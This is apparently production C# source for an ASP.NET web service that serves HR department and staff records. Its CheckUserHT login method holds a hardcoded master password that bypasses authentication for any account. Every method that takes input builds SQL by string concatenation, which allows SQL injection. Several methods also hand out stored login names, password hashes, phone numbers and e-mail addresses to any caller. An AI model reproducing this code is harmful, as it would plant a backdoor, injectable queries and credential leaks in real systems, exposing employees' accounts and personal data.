using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Linq;
using System.Web;
using System.Web.Services;
using System.Web.Services.Protocols;

namespace HrInfoService
{
    /// <summary>
    /// Service1 的摘要说明
    /// </summary>
    [WebService(Namespace = "http://tempuri.org/")]
    [WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
    [ToolboxItem(false)]
    // 若要允许使用 ASP.NET AJAX 从脚本中调用此 Web 服务，请取消对下行的注释。
    // [System.Web.Script.Services.ScriptService]
    public class Service1 : System.Web.Services.WebService
    {
        SqlHelper db = new SqlHelper();
        [WebMethod]
        public DataSet getSysDepInfoHT()
        {
            string sql = "select * from vBaseDepInfo where prowid<>'0000'  ";
            DataSet ds = db.GetDataSetBySQL(sql);
            return ds;
        }
        [WebMethod]
        public DataSet getSysStaffInfoHT()
        {
            string sql ="";
            sql += "SELECT distinct userid,vbu.username,left(depidCSR,4)depid,CASE WHEN PATINDEX('%/%',depname)=0 THEN depname ELSE left(depname,PATINDEX('%/%',depname)-1) end depname,bui.LoginName,bui.LoginPass";
            sql+=" FROM vBaseUDJList vbu  JOIN BASE_UserInfo bui ON vbu.userid=bui.ROWID AND vbu.jobType=0 ";
            DataSet ds = db.GetDataSetBySQL(sql);
            return ds;
        }
        [WebMethod]
        public DataSet getSysDepClssHT(string depid)
        {
            string sql = "select * from vBaseDepInfo where depid='" + depid + "' ";
            DataSet ds = db.GetDataSetBySQL(sql);
            return ds;
        }
        [WebMethod]
        public DataSet getSysStaffClssHT(string userid)
        {
            string sql = "";
            sql += "SELECT distinct userid,vbu.username,left(depidCSR,4)depid,CASE WHEN PATINDEX('%/%',depname)=0 THEN depname ELSE left(depname,PATINDEX('%/%',depname)-1) end depname,bui.LoginName,bui.LoginPass";
            sql += " FROM vBaseUDJList vbu  JOIN BASE_UserInfo bui ON vbu.userid=bui.ROWID AND vbu.jobType=0 AND vbu.userid='" + userid + "'";
            DataSet ds = db.GetDataSetBySQL(sql);
            return ds;
        }

        [WebMethod(Description = "根据登录账号获取人员信息")]
        public DataSet getSysStaffByLoginNameClssHT(string loginname)
        {
            string sql = "";
            sql += "SELECT distinct userid,vbu.username,left(depidCSR,4)depid,CASE WHEN PATINDEX('%/%',depname)=0 THEN depname ELSE left(depname,PATINDEX('%/%',depname)-1) end depname,bui.LoginName,bui.LoginPass,c.Mobile,c.E_mail";
            sql += " FROM vBaseUDJList vbu  JOIN BASE_UserInfo bui ON vbu.userid=bui.ROWID AND vbu.jobType=0 AND bui.LoginName='" + loginname + "' LEFT JOIN dbo.HR_Staff_Details c ON bui.ROWID = c.Staff_Rowid";
            DataSet ds = db.GetDataSetBySQL(sql);
            return ds;
        }

        [WebMethod]
        public string CheckUserHT(string loginname, string loginpwd)
        {
            DataTable dt = null;
            string strSQL = "select rowid,UserName,LoginName from BASE_UserInfo where LoginName='" + loginname
                + "'";
            string rtnMsg = "";
            if (loginpwd != "HanStrong918") strSQL += " and LoginPass ='" + RiaApp.MD5(loginpwd, "") + "'";
            try
            {
                dt = db.GetDataTableBySQL(strSQL);
                if (dt.Rows.Count > 0)
                {
                    rtnMsg = "登录成功";
                }
                else
                {
                    rtnMsg = "用户不存在或密码不对";
                    return rtnMsg;
                }
            }
            catch (Exception ex)
            {
                rtnMsg = "登录错误, 原因:" + ex.Message;
                return rtnMsg;
            }
            finally
            {
                dt.Dispose();
            }
            return rtnMsg;
        }
        [WebMethod(Description = "根据主业部门获取人员信息")]
        public DataSet GetUserInfoByDep(string deptidname, string groupidname, bool isLeader)
        {
            DataSet ds = null;
            try
            {
                string sql = string.Format(@"SELECT * FROM dbo.vBaseDepList where 1=1 ");
                if (!string.IsNullOrEmpty(deptidname))
                {
                    sql += string.Format(@" and deptidname like '%{0}%'", deptidname);
                }
                if (!string.IsNullOrEmpty(groupidname))
                {
                    sql += string.Format(@" and groupidname like '%{0}%'", groupidname);
                }
                if (isLeader)
                {
                    sql += string.Format(@" and joblevel < 4");
                }
                ds = db.GetDataSetBySQL(sql);
                return ds;
            }
            catch (Exception ex)
            {
                
                throw ex;
            }
        }
    }
}
